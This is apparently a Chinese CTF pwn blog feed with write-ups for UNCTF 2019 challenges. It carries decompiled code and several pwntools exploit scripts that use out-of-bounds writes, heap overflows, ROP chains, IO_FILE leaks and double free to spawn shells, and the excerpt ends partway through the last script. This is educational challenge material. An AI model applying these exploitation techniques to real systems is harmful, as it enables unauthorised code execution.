class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> s[<span class="number">13</span>]; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter index"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"enter value"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    s[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your input"</span>);</span><br><span class="line">  v3 = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, s[j]);</span><br><span class="line">    v3 = fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上去流程挺简单的，开头有个off-by-one，接下来一个负数修改，思路大概就是降低第二个函数的栈帧，然后通过负数修改i,修改次数，在修改地址</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./pwn1'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_addr</span><span class="params">(i, addr)</span>:</span></span><br><span class="line">    sla(<span class="string">"enter index\n"</span>, str(i))</span><br><span class="line">    sla(<span class="string">"enter value\n"</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gdb.attach(io, '''</span></span><br><span class="line"><span class="string">               b *0x080486ea</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               c</span></span><br><span class="line"><span class="string">               ''')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sa(<span class="string">"Enter your name \n"</span>, <span class="string">"c"</span>*<span class="number">0x9</span>)</span><br><span class="line">    num = <span class="number">-44</span></span><br><span class="line">    backdoor = <span class="number">0x0804875D</span></span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    __libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    addr = <span class="number">0x80485E7</span></span><br><span class="line">    pack_addr(<span class="number">-1</span>, <span class="number">-34</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">43</span>):</span><br><span class="line">        pack_addr(num+i, backdoor)</span><br><span class="line">    ru(<span class="string">"0 0 0 0 0 0 0 0 0 0 "</span>)</span><br><span class="line">    r()</span><br><span class="line">    <span class="comment">#pack_addr(num+0xb, puts_plt)</span></span><br><span class="line">    <span class="comment">#pack_addr(num+0xc, main_addr)</span></span><br><span class="line">    <span class="comment">#pack_addr(num+0xd, __libc_start_main)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/d70e4493/">https://noone-hub.github.io/posts/d70e4493/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>unctf</title>
    <url>/posts/89fa1574/</url>
    <content><![CDATA[<h1 id="unctf2019-pwn部分题解"><a href="#unctf2019-pwn部分题解" class="headerlink" title="unctf2019 pwn部分题解"></a>unctf2019 pwn部分题解</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>easy，不讲了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.spk5nTEvta/1910245db1406d3eedd'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Plz input size: "</span>, str(size))</span><br><span class="line">    sa(<span class="string">"Plz input content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Plz input index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"a"</span>*<span class="number">0x18</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    r(<span class="number">0x18</span>)</span><br><span class="line">    puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">    lg(<span class="string">"addr"</span>, puts)</span><br><span class="line">    libc.address = puts - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    new(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">    payload = <span class="string">"/bin/sh;#\x00"</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x18</span>, <span class="string">"a"</span>)</span><br><span class="line">    payload += p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x20</span>, payload)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#free(0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>简单</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'./1910245db1406dc99ea'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    gdb.attach(io, '''</span></span><br><span class="line"><span class="string">               finish</span></span><br><span class="line"><span class="string">               finish</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               n</span></span><br><span class="line"><span class="string">               ''')</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    ret = <span class="number">0x08048592</span></span><br><span class="line">    __libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    payload = flat([</span><br><span class="line">        puts_plt,</span><br><span class="line">        ret,</span><br><span class="line">        __libc_start_main_got</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">40</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    payload += p8(<span class="number">0x7c</span>+<span class="number">4</span>)</span><br><span class="line">    s(payload)</span><br><span class="line">    ru(<span class="string">"Ok!goodbye!\n"</span>)</span><br><span class="line">    __libc_start_main_addr = uu32(r(<span class="number">4</span>))</span><br><span class="line">    lg(<span class="string">"__libc_start_main_addr"</span>, __libc_start_main_addr)</span><br><span class="line">    libc_base = __libc_start_main_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = flat([</span><br><span class="line">        system_addr,</span><br><span class="line">        ret,</span><br><span class="line">        bin_sh</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">40</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p8(<span class="number">0x7c</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    <span class="comment">#s(payload)</span></span><br><span class="line">    <span class="comment">#ru("Ok!goodbye!\n")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(<span class="string">'./1910245db1406dc99ea'</span>)</span><br></pre></td></tr></table></figure><h2 id="soeasypwn"><a href="#soeasypwn" class="headerlink" title="soeasypwn"></a>soeasypwn</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">"./"</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'101.71.29.5'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb, timeout=<span class="number">1</span>)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"Welcome our the "</span>)</span><br><span class="line">    leak = int(r(<span class="number">5</span>),<span class="number">10</span>)</span><br><span class="line">    lg(<span class="string">"leak"</span>, leak)</span><br><span class="line">    <span class="comment">#debug(0x902)</span></span><br><span class="line">    addr = hex(leak) + <span class="string">"19CD"</span></span><br><span class="line">    addr = int(addr, <span class="number">16</span>)</span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0xc</span> + p32(addr) + <span class="string">'\x00'</span></span><br><span class="line">    sa(<span class="string">"So, Can you tell me your name?"</span>, payload)</span><br><span class="line">    payload = <span class="string">'\x00'</span></span><br><span class="line">    sa(<span class="string">"(1.hello|2.byebye):"</span>, payload)</span><br><span class="line">    r()</span><br><span class="line">    r()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><p>这里有个小细节，r()两次,</p><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>数组index是可以输入负数的，就是不会利用,后面看了萝卜师傅的wp才知道可以直接改IO_stdout</p><p>我是傻逼！这都想不到</p><p>然后有个double free,新点记录下</p><ul><li>size == 0 ，这个时候等同于free</li><li>realloc_ptr == 0 &amp;&amp; size &gt; 0 ， 这个时候等同于malloc</li><li>malloc_usable_size(realloc_ptr) &gt;= size， 这个时候等同于edit</li><li>malloc_usable_size(realloc_ptr) &lt; szie， 这个时候才是malloc一块更大的内存，将原来的内容复制过去，再将原来的chunk给free掉</li></ul><p>所以利用这个点第一次可以用普通的</p><ol><li>free(ptr)</li><li>realloc(ptr,0)</li></ol><p>这就是double free</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>利用IO_stdout泄露libc地址</li><li>利用double free改realloc为one_gadget</li></ol><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">edit(<span class="number">-12</span>, payload)</span><br><span class="line">lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line"><span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line"> <span class="keyword">raise</span> EOFError</span><br><span class="line"></span><br><span class="line">lg(<span class="string">"addr"</span>, addr)</span><br></pre></td></tr></table></figure><p>这里就是IO_FILE攻击，不清楚的可以自己学下，这里我学到个新操作。。我调试的时候要生要死的，没想到抛出异常，多亏大佬博客了，还有自己复现的时候用ida把前面一段打开文件那部分patch掉吧，不然感觉效率太慢了。。。</p><h4 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h4><p>这里还有个uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>, 